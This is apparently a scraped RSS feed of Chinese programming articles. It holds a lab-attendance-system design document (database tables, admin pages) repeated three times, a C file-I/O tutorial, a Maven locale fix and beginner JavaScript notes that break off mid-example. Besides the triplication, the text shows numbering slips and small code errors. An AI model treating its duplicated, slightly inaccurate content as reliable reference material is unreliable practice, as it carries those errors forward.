实验室考勤管理系统的设计方案比如功能框架的设计，比如数据库的设计的好坏也就决定了该系统在开发层面是否高效，以及在系统维护层面是否容易维护和升级，因为在系统实现阶段是需要考虑用户的所有需求，要是在设计阶段没有经过全方位考虑，那么系统实现的部分也就无从下手，所以系统设计部分也是至关重要的一个环节，只有根据用户需求进行细致全面的考虑，才有希望开发出功能健全稳定的程序软件。
4.1 系统概要设计
本次拟开发的系统为了节约开发成本，也为了后期在维护和升级上的便利性，打算通过浏览器来实现系统功能界面的展示，让程序软件的主要事务集中在后台的服务器端处理，前端部分只用处理少量的事务逻辑。下面使用一张图（如图4.1所示）来说明程序的工作原理。
图4.1 程序工作的原理图
4.2 系统功能结构设计
在分析并得出使用者对程序的功能要求时，就可以进行程序设计了。如图4.2展示的就是管理员功能结构图。
图4.2 系统功能结构图
4.3 数据库设计
程序功能操作不管是添加，修改，还是删除等功能产生的数据都是经由数据库进行数据保存和更新的，所以一个数据库设计的好坏也是程序是否好坏的判定标准，因为程序的成功，有一半的功劳都是靠数据库的优秀设计。数据库一旦设计得良好是可以减轻开发人员的开发负担的。
4.3.1 数据库E-R图设计
这个部分的设计需要使用到E-R图绘制工具，常用的工具就是Visio工具来绘制E-R模型图，这款工具不仅可以快速创建需要的E-R模型图，而且该工具提供的操作界面很简单，可以短时间内修改绘图界面的图形或者是文字的属性。在绘制E-R模型图时，要分清楚各个图形代表的含义，以免绘制出错，E-R模型图由长方形（实体），椭圆形（属性），菱形（关系）这三部分图形符号组成，绘制期间要区分开来，用准确的图形符号代表相应的数据元素。
各个实体之间的联系用下图的E-R图表示。绘制的系统E-R图见图4.8。
图4.8 系统E-R图
4.3.2 数据库表结构设计
数据库系统一旦选定之后，需要根据程序要求在数据库中建立数据库文件，并在已经完成创建的数据库文件里面，为程序运行中产生的数据建立对应的数据表格，数据表结构设计就是对创建的数据表格进行字段设计，字段长度设计，字段类型设计等，当数据表格合理设计完成之后，才能正常存储相关程序运行产生的数据信息。
表4.1班级表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
2
banji_name
String
班级名称
是
3
banji_number
Integer
班级人数
是
4
create_time
Date
创建时间
是
表4.2字典表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
5
dic_code
String
字段
是
6
dic_name
String
字段名
是
7
code_index
Integer
编码
是
8
index_name
String
编码名字
是
9
super_types
Integer
父字段id
是
10
create_time
Date
创建时间
是
表4.3教师表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
11
jiaoshi_name
String
教师姓名
是
12
sex_types
Integer
性别
是
13
jiaoshi_id_number
String
身份证号
是
14
jiaoshi_phone
String
手机号
是
15
jiaoshi_photo
String
照片
是
16
create_time
Date
创建时间
是
表4.4公告表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
17
news_name
String
公告名称
是
18
news_types
Integer
公告类型
是
19
news_photo
String
公告图片
是
20
insert_time
Date
公告时间
是
21
news_content
String
公告详情
是
22
create_time
Date
创建时间
是
表4.5签到表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
23
yuyue_id
Integer
签到课程
是
24
qiandao_name
String
签到人
是
25
qiandao_time
Date
签到时间
是
26
qiantui_time
Date
签退时间
是
27
create_time
Date
创建时间
是
表4.6实验室表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
28
shiyanshi_name
String
实验室名称
是
29
shiyanshi_weizhi
String
实验室位置
是
30
shiyanshi_photo
String
实验室图片
是
31
shiyanshi_content
String
实验室详情
是
32
create_time
Date
创建时间
是
表4.7学生表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
33
yonghu_name
String
学生姓名
是
34
sex_types
Integer
性别
是
35
yonghu_id_number
String
身份证号
是
36
yonghu_phone
String
手机号
是
37
yonghu_photo
String
照片
是
38
banji_id
Integer
所在班级
是
39
create_time
Date
创建时间
是
表4.8实验室预约表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
40
shiyanshi_id
Integer
预约实验室
是
41
jiaoshi_id
Integer
预约教师
是
42
banji_id
Integer
班级
是
43
yuyue_time
Date
预约时间
是
44
yuyue_name
String
所上课程
是
45
yuyue_types
Integer
是否同意
是
46
yuyue_yingdao
Integer
应到人数
是
47
yuyue_yidao
Integer
已签到人数
是
48
create_time
Date
创建时间
是
表4.9用户表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
49
role
String
角色
是
50
addtime
Date
新增时间
是
5 系统实现
系统实现部分就是将系统分析，系统设计部分的内容通过编码进行功能实现，以一个实际应用系统的形式展示系统分析与系统设计的结果。前面提到的系统分析，系统设计最主要还是进行功能，系统操作逻辑的设计，也包括了存储数据的数据库方面的设计等内容，系统实现就是一个最终的实施阶段，将前面的设计成果进行物理转化，最终出具可以运用于实际的软件系统。
5.1学生信息管理
如图5.1显示的就是学生信息管理页面，此页面提供给管理员的功能有：学生信息的查询管理，可以删除学生信息、修改学生信息、新增学生信息，
还进行了对学生名称的模糊查询的条件
图5.1 学生信息管理页面
5.2 教师信息管理
如图5.2显示的就是教师信息管理页面，此页面提供给管理员的功能有：查看已发布的教师信息数据，修改教师信息，教师信息作废，即可删除。
图5.2 教师信息管理页面
5.3实验室管理
如图5.3显示的就是实验室管理页面，此页面提供给管理员的功能有：根据实验室进行条件查询，还可以对实验室进行新增、修改、查询操作等等。
图5.3 实验室管理页面
5.1公告信息管理
如图5.4显示的就是公告信息管理页面，此页面提供给管理员的功能有：根据公告信息进行新增、修改、查询操作等等。
图5.4 公告信息管理页面
基于SSM的实验室考勤管理系统
（源码+L文+说明文档）
4 系统设计
实验室考勤管理系统的设计方案比如功能框架的设计，比如数据库的设计的好坏也就决定了该系统在开发层面是否高效，以及在系统维护层面是否容易维护和升级，因为在系统实现阶段是需要考虑用户的所有需求，要是在设计阶段没有经过全方位考虑，那么系统实现的部分也就无从下手，所以系统设计部分也是至关重要的一个环节，只有根据用户需求进行细致全面的考虑，才有希望开发出功能健全稳定的程序软件。
4.1 系统概要设计
本次拟开发的系统为了节约开发成本，也为了后期在维护和升级上的便利性，打算通过浏览器来实现系统功能界面的展示，让程序软件的主要事务集中在后台的服务器端处理，前端部分只用处理少量的事务逻辑。下面使用一张图（如图4.1所示）来说明程序的工作原理。
图4.1 程序工作的原理图
4.2 系统功能结构设计
在分析并得出使用者对程序的功能要求时，就可以进行程序设计了。如图4.2展示的就是管理员功能结构图。
图4.2 系统功能结构图
4.3 数据库设计
程序功能操作不管是添加，修改，还是删除等功能产生的数据都是经由数据库进行数据保存和更新的，所以一个数据库设计的好坏也是程序是否好坏的判定标准，因为程序的成功，有一半的功劳都是靠数据库的优秀设计。数据库一旦设计得良好是可以减轻开发人员的开发负担的。
4.3.1 数据库E-R图设计
这个部分的设计需要使用到E-R图绘制工具，常用的工具就是Visio工具来绘制E-R模型图，这款工具不仅可以快速创建需要的E-R模型图，而且该工具提供的操作界面很简单，可以短时间内修改绘图界面的图形或者是文字的属性。在绘制E-R模型图时，要分清楚各个图形代表的含义，以免绘制出错，E-R模型图由长方形（实体），椭圆形（属性），菱形（关系）这三部分图形符号组成，绘制期间要区分开来，用准确的图形符号代表相应的数据元素。
各个实体之间的联系用下图的E-R图表示。绘制的系统E-R图见图4.8。
图4.8 系统E-R图
4.3.2 数据库表结构设计
数据库系统一旦选定之后，需要根据程序要求在数据库中建立数据库文件，并在已经完成创建的数据库文件里面，为程序运行中产生的数据建立对应的数据表格，数据表结构设计就是对创建的数据表格进行字段设计，字段长度设计，字段类型设计等，当数据表格合理设计完成之后，才能正常存储相关程序运行产生的数据信息。
表4.1班级表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
2
banji_name
String
班级名称
是
3
banji_number
Integer
班级人数
是
4
create_time
Date
创建时间
是
表4.2字典表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
5
dic_code
String
字段
是
6
dic_name
String
字段名
是
7
code_index
Integer
编码
是
8
index_name
String
编码名字
是
9
super_types
Integer
父字段id
是
10
create_time
Date
创建时间
是
表4.3教师表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
11
jiaoshi_name
String
教师姓名
是
12
sex_types
Integer
性别
是
13
jiaoshi_id_number
String
身份证号
是
14
jiaoshi_phone
String
手机号
是
15
jiaoshi_photo
String
照片
是
16
create_time
Date
创建时间
是
表4.4公告表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
17
news_name
String
公告名称
是
18
news_types
Integer
公告类型
是
19
news_photo
String
公告图片
是
20
insert_time
Date
公告时间
是
21
news_content
String
公告详情
是
22
create_time
Date
创建时间
是
表4.5签到表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
23
yuyue_id
Integer
签到课程
是
24
qiandao_name
String
签到人
是
25
qiandao_time
Date
签到时间
是
26
qiantui_time
Date
签退时间
是
27
create_time
Date
创建时间
是
表4.6实验室表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
28
shiyanshi_name
String
实验室名称
是
29
shiyanshi_weizhi
String
实验室位置
是
30
shiyanshi_photo
String
实验室图片
是
31
shiyanshi_content
String
实验室详情
是
32
create_time
Date
创建时间
是
表4.7学生表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
33
yonghu_name
String
学生姓名
是
34
sex_types
Integer
性别
是
35
yonghu_id_number
String
身份证号
是
36
yonghu_phone
String
手机号
是
37
yonghu_photo
String
照片
是
38
banji_id
Integer
所在班级
是
39
create_time
Date
创建时间
是
表4.8实验室预约表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
40
shiyanshi_id
Integer
预约实验室
是
41
jiaoshi_id
Integer
预约教师
是
42
banji_id
Integer
班级
是
43
yuyue_time
Date
预约时间
是
44
yuyue_name
String
所上课程
是
45
yuyue_types
Integer
是否同意
是
46
yuyue_yingdao
Integer
应到人数
是
47
yuyue_yidao
Integer
已签到人数
是
48
create_time
Date
创建时间
是
表4.9用户表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
49
role
String
角色
是
50
addtime
Date
新增时间
是
5 系统实现
系统实现部分就是将系统分析，系统设计部分的内容通过编码进行功能实现，以一个实际应用系统的形式展示系统分析与系统设计的结果。前面提到的系统分析，系统设计最主要还是进行功能，系统操作逻辑的设计，也包括了存储数据的数据库方面的设计等内容，系统实现就是一个最终的实施阶段，将前面的设计成果进行物理转化，最终出具可以运用于实际的软件系统。
5.1学生信息管理
如图5.1显示的就是学生信息管理页面，此页面提供给管理员的功能有：学生信息的查询管理，可以删除学生信息、修改学生信息、新增学生信息，
还进行了对学生名称的模糊查询的条件
图5.1 学生信息管理页面
5.2 教师信息管理
如图5.2显示的就是教师信息管理页面，此页面提供给管理员的功能有：查看已发布的教师信息数据，修改教师信息，教师信息作废，即可删除。
图5.2 教师信息管理页面
5.3实验室管理
如图5.3显示的就是实验室管理页面，此页面提供给管理员的功能有：根据实验室进行条件查询，还可以对实验室进行新增、修改、查询操作等等。
图5.3 实验室管理页面
5.1公告信息管理
如图5.4显示的就是公告信息管理页面，此页面提供给管理员的功能有：根据公告信息进行新增、修改、查询操作等等。
图5.4 公告信息管理页面
基于SSM的实验室考勤管理系统
（源码+L文+说明文档）
4 系统设计
实验室考勤管理系统的设计方案比如功能框架的设计，比如数据库的设计的好坏也就决定了该系统在开发层面是否高效，以及在系统维护层面是否容易维护和升级，因为在系统实现阶段是需要考虑用户的所有需求，要是在设计阶段没有经过全方位考虑，那么系统实现的部分也就无从下手，所以系统设计部分也是至关重要的一个环节，只有根据用户需求进行细致全面的考虑，才有希望开发出功能健全稳定的程序软件。
4.1 系统概要设计
本次拟开发的系统为了节约开发成本，也为了后期在维护和升级上的便利性，打算通过浏览器来实现系统功能界面的展示，让程序软件的主要事务集中在后台的服务器端处理，前端部分只用处理少量的事务逻辑。下面使用一张图（如图4.1所示）来说明程序的工作原理。
图4.1 程序工作的原理图
4.2 系统功能结构设计
在分析并得出使用者对程序的功能要求时，就可以进行程序设计了。如图4.2展示的就是管理员功能结构图。
图4.2 系统功能结构图
4.3 数据库设计
程序功能操作不管是添加，修改，还是删除等功能产生的数据都是经由数据库进行数据保存和更新的，所以一个数据库设计的好坏也是程序是否好坏的判定标准，因为程序的成功，有一半的功劳都是靠数据库的优秀设计。数据库一旦设计得良好是可以减轻开发人员的开发负担的。
4.3.1 数据库E-R图设计
这个部分的设计需要使用到E-R图绘制工具，常用的工具就是Visio工具来绘制E-R模型图，这款工具不仅可以快速创建需要的E-R模型图，而且该工具提供的操作界面很简单，可以短时间内修改绘图界面的图形或者是文字的属性。在绘制E-R模型图时，要分清楚各个图形代表的含义，以免绘制出错，E-R模型图由长方形（实体），椭圆形（属性），菱形（关系）这三部分图形符号组成，绘制期间要区分开来，用准确的图形符号代表相应的数据元素。
各个实体之间的联系用下图的E-R图表示。绘制的系统E-R图见图4.8。
图4.8 系统E-R图
4.3.2 数据库表结构设计
数据库系统一旦选定之后，需要根据程序要求在数据库中建立数据库文件，并在已经完成创建的数据库文件里面，为程序运行中产生的数据建立对应的数据表格，数据表结构设计就是对创建的数据表格进行字段设计，字段长度设计，字段类型设计等，当数据表格合理设计完成之后，才能正常存储相关程序运行产生的数据信息。
表4.1班级表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
2
banji_name
String
班级名称
是
3
banji_number
Integer
班级人数
是
4
create_time
Date
创建时间
是
表4.2字典表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
5
dic_code
String
字段
是
6
dic_name
String
字段名
是
7
code_index
Integer
编码
是
8
index_name
String
编码名字
是
9
super_types
Integer
父字段id
是
10
create_time
Date
创建时间
是
表4.3教师表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
11
jiaoshi_name
String
教师姓名
是
12
sex_types
Integer
性别
是
13
jiaoshi_id_number
String
身份证号
是
14
jiaoshi_phone
String
手机号
是
15
jiaoshi_photo
String
照片
是
16
create_time
Date
创建时间
是
表4.4公告表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
17
news_name
String
公告名称
是
18
news_types
Integer
公告类型
是
19
news_photo
String
公告图片
是
20
insert_time
Date
公告时间
是
21
news_content
String
公告详情
是
22
create_time
Date
创建时间
是
表4.5签到表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
23
yuyue_id
Integer
签到课程
是
24
qiandao_name
String
签到人
是
25
qiandao_time
Date
签到时间
是
26
qiantui_time
Date
签退时间
是
27
create_time
Date
创建时间
是
表4.6实验室表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
28
shiyanshi_name
String
实验室名称
是
29
shiyanshi_weizhi
String
实验室位置
是
30
shiyanshi_photo
String
实验室图片
是
31
shiyanshi_content
String
实验室详情
是
32
create_time
Date
创建时间
是
表4.7学生表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
33
yonghu_name
String
学生姓名
是
34
sex_types
Integer
性别
是
35
yonghu_id_number
String
身份证号
是
36
yonghu_phone
String
手机号
是
37
yonghu_photo
String
照片
是
38
banji_id
Integer
所在班级
是
39
create_time
Date
创建时间
是
表4.8实验室预约表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
40
shiyanshi_id
Integer
预约实验室
是
41
jiaoshi_id
Integer
预约教师
是
42
banji_id
Integer
班级
是
43
yuyue_time
Date
预约时间
是
44
yuyue_name
String
所上课程
是
45
yuyue_types
Integer
是否同意
是
46
yuyue_yingdao
Integer
应到人数
是
47
yuyue_yidao
Integer
已签到人数
是
48
create_time
Date
创建时间
是
表4.9用户表表
序号
列名
数据类型
说明
允许空
1
Id
Int
id
否
49
role
String
角色
是
50
addtime
Date
新增时间
是
5 系统实现
系统实现部分就是将系统分析，系统设计部分的内容通过编码进行功能实现，以一个实际应用系统的形式展示系统分析与系统设计的结果。前面提到的系统分析，系统设计最主要还是进行功能，系统操作逻辑的设计，也包括了存储数据的数据库方面的设计等内容，系统实现就是一个最终的实施阶段，将前面的设计成果进行物理转化，最终出具可以运用于实际的软件系统。
5.1学生信息管理
如图5.1显示的就是学生信息管理页面，此页面提供给管理员的功能有：学生信息的查询管理，可以删除学生信息、修改学生信息、新增学生信息，
还进行了对学生名称的模糊查询的条件
图5.1 学生信息管理页面
5.2 教师信息管理
如图5.2显示的就是教师信息管理页面，此页面提供给管理员的功能有：查看已发布的教师信息数据，修改教师信息，教师信息作废，即可删除。
图5.2 教师信息管理页面
5.3实验室管理
如图5.3显示的就是实验室管理页面，此页面提供给管理员的功能有：根据实验室进行条件查询，还可以对实验室进行新增、修改、查询操作等等。
图5.3 实验室管理页面
5.1公告信息管理
如图5.4显示的就是公告信息管理页面，此页面提供给管理员的功能有：根据公告信息进行新增、修改、查询操作等等。
图5.4 公告信息管理页面
源码获取</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540141.html</guid><pubDate>Fri, 31 Oct 2025 07:25:46 +0000</pubDate></item><item><title>C语言中的文件操作：从基础到深入底层原理</title><link>https://www.ppmy.cn/news/1540142.html</link><description>文件操作是几乎所有应用程序的重要组成部分，特别是在系统级编程中。C语言因其高效、灵活以及接近硬件的特点，成为了文件操作的理想选择。本文将全面深入地探讨C语言中的文件操作，从文件系统的概念到具体的文件操作函数，再到底层的系统调用机制，以及高级的文件映射技术。我们将通过详细的解释和示例代码来帮助读者理解每个知识点。
文件系统基础
文件与文件系统
文件系统是操作系统用来组织和管理文件的一种逻辑结构。它定义了文件是如何存储、命名、共享、修改和检索的。文件系统通常以树状结构组织，其中根目录是树的起点，每个文件或目录都是树的一个节点。文件系统还定义了文件的元数据，如权限、所有者、创建时间等。
文件系统的类型
FAT
：早期的文件系统，常见于软盘和USB驱动器。
NTFS
：Windows的主要文件系统，支持权限控制、压缩等功能。
ext4
：Linux常用的文件系统，支持日志记录、扩展属性等。
APFS
：Apple的新一代文件系统，适用于macOS和iOS设备。
文件描述符与文件句柄
在操作系统层面，每一个打开的文件都有一个关联的文件描述符（File Descriptor），它是操作系统分配给文件的一个整数标识符。而在C语言中，文件描述符通过
FILE
结构体（文件句柄）来抽象表示。
文件描述符的生命周期
打开文件
：通过
open
系统调用获得一个文件描述符。
读写文件
：使用
read
和
write
系统调用进行读写操作。
关闭文件
：通过
close
系统调用释放文件描述符。
文件句柄的生命周期
打开文件
：通过
fopen
函数获得一个指向
FILE
结构体的指针。
读写文件
：使用
fread
、
fwrite
等函数进行读写操作。
关闭文件
：通过
fclose
函数释放文件句柄。
文件描述符与句柄的关系
FILE
结构体包含了一个文件描述符，用于与底层的系统调用交互。此外，它还包括了缓冲区、当前文件位置等信息，使得文件操作更加高效。
FILE
结构体的内部实现
FILE
结构体的具体实现细节依赖于编译器和操作系统，但通常包括以下几个关键字段：
_ptr
: 当前读/写位置的指针。
_cnt
: 缓冲区中剩余未处理的字节数。
_base
: 缓冲区的基地址。
_flag
: 标志位，用于指示文件的状态（如是否可读写）。
_file
: 文件描述符，用于系统调用。
_bufsiz
: 缓冲区大小。
_mode
: 文件的打开模式（如只读、写入等）。
缓冲机制
标准I/O库中的一个重要特性是缓冲机制。缓冲区是用来暂时存储待读写的数据，减少系统调用次数，提高效率。缓冲类型有三种：
无缓冲
：每个读写操作都直接对应一次系统调用。
行缓冲
：当遇到换行符时才刷新缓冲区。
全缓冲
：当缓冲区满或显式调用
fflush
时才刷新。
缓冲机制通过
setvbuf
函数来设置：
int
setvbuf
(
FILE
*
stream
,
char
*
buf
,
int
mode
,
size_t
size
)
;
文件操作函数详解
文件打开与关闭
fopen
：打开或创建文件，并返回指向
FILE
结构体的指针。
fclose
：关闭文件，并释放相关资源。
示例代码：
FILE
*
fp
=
fopen
(
"example.txt"
,
"w"
)
;
if
(
fp
==
NULL
)
{
perror
(
"Failed to open file"
)
;
exit
(
EXIT_FAILURE
)
;
}
fclose
(
fp
)
;
打开模式
"r"
：只读模式。
"w"
：写入模式，如果文件存在则会被截断为零长度。
"a"
：追加模式，所有写入操作都发生在文件末尾。
"r+"
：读写模式。
"w+"
：读写模式，如果文件存在则会被截断为零长度。
"a+"
：读写模式，所有写入操作都发生在文件末尾。
文件读写
fread
：从文件读取数据到指定的缓冲区。
fwrite
：将数据从缓冲区写入文件。
示例代码：
char
buffer
[
256
]
;
size_t
bytesRead
=
fread
(
buffer
,
1
,
sizeof
(
buffer
)
,
fp
)
;
fwrite
(
buffer
,
1
,
bytesRead
,
fp
)
;
读写函数的参数
第一个参数是指向目标或源缓冲区的指针。
第二个参数是单个元素的大小。
第三个参数是元素的数量。
第四个参数是
FILE
结构体的指针。
文件定位
fseek
：改变文件位置指针。
ftell
：获取当前文件位置指针的位置。
示例代码：
fseek
(
fp
,
1024
,
SEEK_SET
)
;
// 移动到文件开头后的第1024个字节
long
pos
=
ftell
(
fp
)
;
// 获取当前文件位置
文件位置指针
文件位置指针（File Position Pointer）是相对于文件开头的一个偏移量，用于记录当前的读写位置。
fseek
函数允许你向前或向后移动指针，而
ftell
则返回当前位置。
文件映射
文件映射是一种高效的数据处理方法，它将文件内容直接映射到进程的虚拟地址空间，使得对文件的操作就像对内存的操作一样简单。
使用
mmap
进行文件映射
mmap
函数可以将文件或其他对象映射到内存，映射的内存区域可以直接被读写。
#
include
&lt;sys/mman.h&gt;
#
include
&lt;fcntl.h&gt;
int
main
(
void
)
{
int
fd
=
open
(
"largefile.dat"
,
O_RDONLY
)
;
struct
stat
st
;
fstat
(
fd
,
&amp;
st
)
;
void
*
addr
=
mmap
(
NULL
,
st
.
st_size
,
PROT_READ
,
MAP_PRIVATE
,
fd
,
0
)
;
if
(
addr
==
MAP_FAILED
)
{
perror
(
"mmap"
)
;
return
-
1
;
}
// 处理映射内存
munmap
(
addr
,
st
.
st_size
)
;
close
(
fd
)
;
return
0
;
}
文件映射的优点
高效性
：避免了多次读写系统调用。
一致性
：保证了数据的一致性和完整性。
灵活性
：支持多种映射类型，如共享映射和私有映射。
映射类型
MAP_SHARED
：多个进程可以共享同一段映射内存，对映射区域的修改会反映到文件上。
MAP_PRIVATE
：私有映射，对映射区域的修改不会影响原始文件。
错误处理
在进行文件操作时，必须考虑到可能出现的各种错误，并妥善处理。常见的错误包括文件不存在、权限不足等。
错误检测
每次调用文件操作函数后都应该检查其返回值，并根据需要处理错误：
FILE
*
fp
=
fopen
(
"example.txt"
,
"r"
)
;
if
(
fp
==
NULL
)
{
perror
(
"Failed to open file"
)
;
return
-
1
;
}
char
buffer
[
256
]
;
size_t
bytesRead
=
fread
(
buffer
,
1
,
sizeof
(
buffer
)
,
fp
)
;
if
(
bytesRead
==
0
)
{
perror
(
"Failed to read file"
)
;
return
-
1
;
}
错误代码与错误处理
错误代码通常通过全局变量
errno
返回，它是一个整数，不同的错误对应不同的值。例如：
ENOENT
：没有这样的文件或目录。
EACCES
：权限错误。
ENOMEM
：内存不足。
示例代码：
if
(
fopen
(
"example.txt"
,
"r"
)
==
NULL
)
{
if
(
errno
==
ENOENT
)
{
fprintf
(
stderr
,
"File does not exist.\n"
)
;
}
else
if
(
errno
==
EACCES
)
{
fprintf
(
stderr
,
"Permission denied.\n"
)
;
}
else
{
perror
(
"Unknown error occurred while opening the file."
)
;
}
return
-
1
;
}
高级主题
同步与异步文件操作
在多线程或多进程环境中，文件操作需要考虑同步问题，以避免数据竞争。使用互斥锁（mutex）可以保护共享资源不被并发访问破坏。
pthread_mutex_lock
(
&amp;
file_mutex
)
;
// 进行文件操作
pthread_mutex_unlock
(
&amp;
file_mutex
)
;
异步文件操作则允许在文件操作完成之前继续执行其他任务，这对于I/O密集型应用尤为有用。异步文件操作通常通过信号量或事件通知来实现。
异步文件操作
POSIX异步I/O
：提供了异步读写接口，如
aio_read
和
aio_write
。
libaio
：一个专门用于实现异步I/O的库。
文件权限与安全
文件权限决定了谁可以访问文件以及如何访问。在Linux中，文件权限由用户、组和其他人三类权限组成。使用
chmod
可以修改文件权限。
chmod
(
"example.txt"
,
S_IRUSR
|
S_IWUSR
)
;
// 设置为仅当前用户可读写
此外，还需要注意文件的加密与解密，确保数据的安全性。使用加密算法（如AES）可以在存储和传输文件时保护敏感数据。
加密算法
对称加密
：使用相同的密钥进行加密和解密，如AES。
非对称加密
：使用一对公钥和私钥进行加密和解密，如RSA。
文件系统类型
不同的操作系统支持不同的文件系统类型。例如：
ext4
：Linux常用的文件系统，支持日志记录、扩展属性等。
NTFS
：Windows的主要文件系统，支持权限控制、压缩等。
HFS+
：macOS的文件系统，支持元数据搜索等。
每种文件系统都有其特点和适用场景，选择合适的文件系统可以提高性能和可靠性。
底层系统调用
系统调用机制
系统调用是用户态程序与内核态程序之间通信的接口。通过系统调用，应用程序可以请求操作系统提供服务，如打开文件、读写数据等。
系统调用的过程
用户态程序调用系统调用函数。
CPU切换到内核态执行相应的系统调用处理程序。
内核态处理完请求后，结果返回给用户态程序。
典型系统调用
open
：打开或创建一个文件。
close
：关闭一个已打开的文件。
read
：从文件描述符读取数据。
write
：向文件描述符写入数据。
lseek
：改变文件描述符的偏移量。
示例代码：
#
include
&lt;unistd.h&gt;
#
include
&lt;fcntl.h&gt;
#
include
&lt;stdio.h&gt;
#
include
&lt;sys/stat.h&gt;
#
include
&lt;sys/types.h&gt;
int
main
(
void
)
{
int
fd
=
open
(
"example.txt"
,
O_WRONLY
|
O_CREAT
,
0644
)
;
if
(
fd
==
-
1
)
{
perror
(
"open"
)
;
return
-
1
;
}
const
char
*
hello
=
"Hello, world!\n"
;
ssize_t
bytesWritten
=
write
(
fd
,
hello
,
strlen
(
hello
)
)
;
if
(
bytesWritten
!=
strlen
(
hello
)
)
{
perror
(
"write"
)
;
return
-
1
;
}
close
(
fd
)
;
return
0
;
}
系统调用与标准I/O库的关系
标准I/O库是在系统调用的基础上构建的一层抽象，它提供了更高级的功能和更方便的使用方式。例如，
fopen
函数实际上是通过
open
系统调用来打开文件，然后设置了
FILE
结构体中的相关字段。
文件操作的最佳实践
安全性
权限管理
：确保只有授权用户可以访问文件。
加密
：对敏感数据进行加密处理。
备份
：定期备份重要文件以防数据丢失。
数据备份
增量备份
：只备份自上次备份以来更改过的文件。
完全备份
：备份所有文件，无论是否已经备份过。
性能优化
缓冲机制
：合理设置缓冲区大小以提高效率。
文件映射
：对于大量数据的处理，使用文件映射可以显著提高性能。
并发处理
：在多线程或多进程中进行文件操作时，使用同步机制保证数据的一致性。
并发文件操作
互斥锁
：防止多个线程同时访问同一文件。
条件变量
：等待特定条件满足后再继续执行。
资源管理
及时关闭文件
：不再使用文件时应立即关闭，释放资源。
异常处理
：在发生错误时正确处理，避免资源泄露。
异常处理
异常捕获
：使用异常处理机制（如try-catch）来捕获并处理异常。
资源释放
：确保在异常发生时释放已分配的资源。
结论
本文详细探讨了C语言中的文件操作，从文件系统的概念到具体的文件操作函数，再到底层的系统调用机制，以及高级的文件映射技术。掌握了这些知识后，开发者可以更加高效地处理文件相关的任务，并编写出更为可靠和高效的程序。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540142.html</guid><pubDate>Fri, 31 Oct 2025 07:25:50 +0000</pubDate></item><item><title>maven构建中文文件名导致的报错</title><link>https://www.ppmy.cn/news/1540143.html</link><description>设置中文字符
ENV LANG=C.UTF-8
ENV LC_ALL=C.UTF-8</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540143.html</guid><pubDate>Fri, 31 Oct 2025 07:25:51 +0000</pubDate></item><item><title>5、JavaScript(一)</title><link>https://www.ppmy.cn/news/1540144.html</link><description>1.javaScript:负责⽹⻚功能的
笔试可能会遇到的问题 面试可能遇到的问题/重点概念
html+css实现静态页面，js负责网页的功能
ECMAScript(核⼼5.0) + DOM(⻚⾯操作) + BOM(浏览器操作相关的)
script需要放在body的结束标签之前；也可以像css一样外部引入：在&lt;body&gt;标签中&lt;script src=”路径”&gt;&lt;/script&gt;
script标签要么用来引入js文件，要么用来写js代码，但是不能两样事情都做，即不能在script标签中既用src引入js文件，又在里面写js代码。
2.编程语⾔
c ：操作系统、嵌⼊式、驱动开发
c++ ：桌⾯软件、游戏 (英雄联盟)
c# ：Windows桌⾯软件、.NET Web、服务器
java:企业级应⽤，web开发、服务器后端 python
php
javaScript
3.程序员
程序运行于内存中，内存大的在同时开启多个软件时的运行更加流畅，更加快速。
程序运行于内存中，内存是处理数据的，因此数据在内存中。
变量：内存中专⻔⽤来存储数据的空间
程序: 处理数据的 接受数据--处理数据--输出数据 程序运⾏在内存中
数据：语⾔啊 阿拉伯数字
4.变量
临时存储数据的
何时使⽤:如果数据需要临时存储的时候，那么就需要变量
关键字：程序中特殊含义的字符
如何使⽤: 声明—命名—初始化
1.声明变量(var) 2.命名 (变量的命名规则：不能⽤关键字，不能⽤中⽂，不能⽤特殊符号，⻅名知意，不能⽤纯数字，不能⽤数字打头，可以⼤写，严格区分大小写(通常小写)；名字由多个单词组成的话要用驼峰式命名(除了首字母外其他单词的首字母大写myName)或大驼峰(全部的首字母都大写MyName)) 3.初始化变量后 用等号加数据 =是赋值的意思
如var money=123
2.使⽤变量就相当于使⽤变量⾥⾯的数据
3.⼀个变量只能存⼀个数据
4.变量是可以更改的 变量名=新值
5.变量声明了但是没有赋值，如果此时要输出该变量的值，结果为undefined
6.对于未声明的变量
直接赋值
(直接使用是错的)
，那么js会⾃动帮你在
全局
声明(即使是在函数内对未声明的变量进行了直接赋值，那这时就变成了全局变量)
//在函数内a未进行声明就直接赋值了，这时js会自动帮忙在全局声明，因此a就变成了全局变量，在全局范围内都可以访问的到了
function fn() {
a = 5;//a未声明直接赋值了
}
fn()
console.log(a)//输出结果：5
7.变量声明提前/变量提升：只要是变量声明语句都会提前，变量声明语句会⾃动提升到当前作⽤域最顶部(只是声明提前，赋值并没有提前)
例:变量声明提前+变量只是声明了但没有赋值结果为undefined
function fn() {
//相当于将变量声明的语句var a 提前到了这里，但是赋值的语句并没有提前
//将变量声明提前到了该作用域，即函数内的最顶部，而不是全局的最顶部
